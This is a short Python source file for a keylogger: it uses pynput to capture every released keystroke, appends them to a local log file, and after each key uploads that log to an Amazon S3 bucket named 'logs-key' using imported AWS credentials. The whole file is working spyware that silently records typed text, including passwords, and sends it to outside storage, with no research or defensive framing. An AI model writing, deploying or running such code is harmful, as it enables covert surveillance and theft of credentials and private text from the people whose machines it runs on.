from pynput.keyboard import Key, Listener
from secrets import access_key, secret_access_key
import boto3
import os
import time


def log(text):
	with open("log.txt","a") as file_log:
		file_log.write(text)


def s3():
    client = boto3.client('s3', 
    aws_access_key_id = access_key, 
    aws_secret_access_key = secret_access_key)

    
    for file in os.listdir():
        if 'log.txt' in file:
            upload_file_bucket = "logs-key"
            upload_file_key = str(file)
            client.upload_file(file, upload_file_bucket, upload_file_key)


def press(key):
    key = str(key).replace("'", "")
    
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key == "Key.shift":
        key = ''

    log(key)
    s3()


with Listener(on_release=press) as listener:
	listener.join()